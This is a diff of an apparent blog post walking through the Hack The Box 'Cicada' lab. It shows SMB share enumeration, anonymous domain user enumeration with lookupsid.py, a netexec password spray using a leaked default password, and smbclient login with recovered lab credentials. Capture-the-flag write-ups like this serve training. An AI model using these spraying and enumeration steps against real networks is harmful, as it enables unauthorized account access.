@@ -25,7 +25,7 @@
 <p>Seen in the previous task, from listing the contents of the HR share, the file name is "Notice from HR.txt".</p>
 <h3 class="anchor anchorWithStickyNavbar_LWe7" id="task-3">Task 3<a href="https://danae-pan.github.io/Blog/blog/Cicada#task-3" class="hash-link" aria-label="Direct link to Task 3" title="Direct link to Task 3">​</a></h3>
 <p>Which user account is still using the company default password?</p>
-<p>To see the contents of the file found, we can transfer it to the host by running ``get "Notice from HR.txt". Opening it, we see a welcoming message to a new hire with the default password but it does not give a username</p>
+<p>To see the contents of the file found, we can transfer it to the host by running <code>get "Notice from HR</code>.txt". Opening it, we see a welcoming message to a new hire with the default password but it does not give a username</p>
 <p><img decoding="async" loading="lazy" alt="alt text" src="https://danae-pan.github.io/Blog/assets/images/image-ci-3-d2178dfc2751758ad33ea1b8ab1c2ad0.png" width="1546" height="506" class="img_ev3q"></p>
 <p>Then, we can try to enumerate domain users on the target IP and save them to a file by running <code>lookupsid.py anonymous@&lt;target_ip&gt; &gt; lookupsid_output.txt</code>. Then, we save the usernames cleanly we run <code>grep '(SidTypeUser)' lookupsid_output.txt | awk -F '\\' '{print $2}' | cut -d' ' -f1 &gt; users.txt</code>.  Finally using the password found in the file, we can perform a password spray attack by running <code>netexec smb &lt;target_ip&gt; -u users.txt -p 'Cicada$M6Corpb*@Lp#nZp!8'</code> and find the username to be michael.wrightson.</p>
 <p><img decoding="async" loading="lazy" alt="alt text" src="https://danae-pan.github.io/Blog/assets/images/image-ci-5-c5ee995f367e271c4fee423af0310ef2.png" width="2286" height="812" class="img_ev3q"></p>
@@ -35,7 +35,6 @@
 <p><img decoding="async" loading="lazy" alt="alt text" src="https://danae-pan.github.io/Blog/assets/images/image-ci-6-3faaff942dfef3c5779551800503056d.png" width="1696" height="808" class="img_ev3q"></p>
 <p>After finding the password we can try to connect with it using the users.txt file from the previous task as <code>netexec smb &lt;target_ip&gt; -u users.txt -p 'aRt$Lp#7t*VQ!3'</code>.</p>
 <p><img decoding="async" loading="lazy" alt="alt text" src="https://danae-pan.github.io/Blog/assets/images/image-ci-7-c2c4836b59b20798e6ecf167ebf3d68c.png" width="1696" height="974" class="img_ev3q"></p>
-<p><code>&lt;!-- truncate --&gt;</code></p>
 <h3 class="anchor anchorWithStickyNavbar_LWe7" id="task-5">Task 5<a href="https://danae-pan.github.io/Blog/blog/Cicada#task-5" class="hash-link" aria-label="Direct link to Task 5" title="Direct link to Task 5">​</a></h3>
 <p>What is the name of the PowerShell script located in the DEV share?</p>
 <p>Connecting to the DEV share with the credential found in the previous task by running <code>smbclient //&lt;target_ip&gt;/DEV -U 'cicada.htb\\david.orelious%aRt$Lp#7t*VQ!3'</code> we find the Powershell script after listing the contents.</p>
